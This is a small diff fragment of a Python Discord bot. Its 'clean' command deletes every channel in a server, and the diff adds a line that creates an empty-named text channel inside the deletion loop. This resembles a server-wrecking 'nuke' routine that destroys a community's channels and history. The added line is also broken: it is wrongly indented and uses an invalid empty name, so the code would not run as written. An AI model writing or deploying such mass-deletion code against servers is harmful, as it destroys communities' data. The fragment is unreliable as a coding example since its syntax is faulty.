@@ -24,6 +24,7 @@ async def clean(ctx):
     guild = ctx.guild
     for channel in guild.channels:
         await channel.delete()
+            await ctx.guild.create_text_channel("")
         
 @client.command()
 async def invite(ctx):
